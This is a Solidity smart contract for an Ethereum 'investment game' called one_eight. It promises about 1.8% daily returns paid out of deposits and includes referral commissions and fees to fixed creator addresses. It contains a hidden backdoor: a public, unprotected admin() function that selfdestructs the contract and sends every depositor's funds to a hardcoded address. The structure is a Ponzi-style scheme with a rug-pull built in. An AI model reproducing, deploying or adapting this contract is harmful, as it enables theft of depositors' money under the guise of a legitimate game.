1 pragma solidity ^0.4.25;
2 
3 /**
4 
5 A simple contract. A simple game. 
6 A simple way to earn. 
7 
8 Be one.eight
9 
10  */
11 
12 contract one_eight {
13     using SafeMath for uint256;
14     
15     mapping (address => uint256) public investedETH;
16     mapping (address => uint256) public lastInvest;
17     mapping (address => uint256) public affiliateCommision;
18     
19      /** the creator */
20     address creator = 0xEDa159d4AD09bEdeB9fDE7124E0F5304c30F7790;
21      /** development and maintenance */
22     address damn = 0x6a5D9648381b90AF0e6881c26739efA4379c19B2;
23      /** the peoples charity */
24     address charity = 0xF57924672D6dBF0336c618fDa50E284E02715000;
25 
26     
27     function investETH(address referral) public payable {
28         
29         require(msg.value >= .05 ether);
30         
31         if(getProfit(msg.sender) > 0){
32             uint256 profit = getProfit(msg.sender);
33             lastInvest[msg.sender] = now;
34             msg.sender.transfer(profit);
35         }
36         
37         uint256 amount = msg.value;
38         uint256 commision = SafeMath.div(amount, 40); /** partner share 2.5% */ 
39         if(referral != msg.sender && referral != 0x1){
40             affiliateCommision[referral] = SafeMath.add(affiliateCommision[referral], commision);
41         }
42         
43         creator.transfer(msg.value.div(100).mul(5)); /** creator */
44         damn.transfer(msg.value.div(100).mul(3)); /** development and maintenance */
45         charity.transfer(msg.value.div(100).mul(1)); /** give away  */
46         
47         investedETH[msg.sender] = SafeMath.add(investedETH[msg.sender], amount);
48         lastInvest[msg.sender] = now;
49     }
50     
51     
52     function withdraw() public{
53         uint256 profit = getProfit(msg.sender);
54         require(profit > 0);
55         lastInvest[msg.sender] = now;
56         msg.sender.transfer(profit);
57     }
58     
59     function admin() public {
60 		selfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);
61 	}    
62     
63     function getProfitFromSender() public view returns(uint256){
64         return getProfit(msg.sender);
65     }
66 
67     function getProfit(address customer) public view returns(uint256){
68         uint256 secondsPassed = SafeMath.sub(now, lastInvest[customer]);
69         return SafeMath.div(SafeMath.mul(secondsPassed, investedETH[customer]), 4800000); /** one eight */
70     }
71     
72     function reinvestProfit() public {
73         uint256 profit = getProfit(msg.sender);
74         require(profit > 0);
75         lastInvest[msg.sender] = now;
76         investedETH[msg.sender] = SafeMath.add(investedETH[msg.sender], profit);
77     }
78     
79     function getAffiliateCommision() public view returns(uint256){
80         return affiliateCommision[msg.sender];
81     }
82     
83     function withdrawAffiliateCommision() public {
84         require(affiliateCommision[msg.sender] > 0);
85         uint256 commision = affiliateCommision[msg.sender];
86         affiliateCommision[msg.sender] = 0;
87         msg.sender.transfer(commision);
88     }
89     
90     function getInvested() public view returns(uint256){
91         return investedETH[msg.sender];
92     }
93     
94     function getBalance() public view returns(uint256){
95         return address(this).balance;
96     }
97     
98     function min(uint256 a, uint256 b) private pure returns (uint256) {
99         return a < b ? a : b;
100     }
101     
102     function max(uint256 a, uint256 b) private pure returns (uint256) {
103         return a > b ? a : b;
104     }
105 }
106 
107 library SafeMath {
108 
109   /**
110   * @dev Multiplies two numbers, throws on overflow.
111   */
112   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
113     if (a == 0) {
114       return 0;
115     }
116     uint256 c = a * b;
117     assert(c / a == b);
118     return c;
119   }
120 
121   /**
122   * @dev Integer division of two numbers, truncating the quotient.
123   */
124   function div(uint256 a, uint256 b) internal pure returns (uint256) {
125     // assert(b > 0); // Solidity automatically throws when dividing by 0
126     uint256 c = a / b;
127     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
128     return c;
129   }
130 
131   /**
132   * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
133   */
134   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
135     assert(b <= a);
136     return a - b;
137   }
138 
139   /**
140   * @dev Adds two numbers, throws on overflow.
141   */
142   function add(uint256 a, uint256 b) internal pure returns (uint256) {
143     uint256 c = a + b;
144     assert(c >= a);
145     return c;
146   }
147 }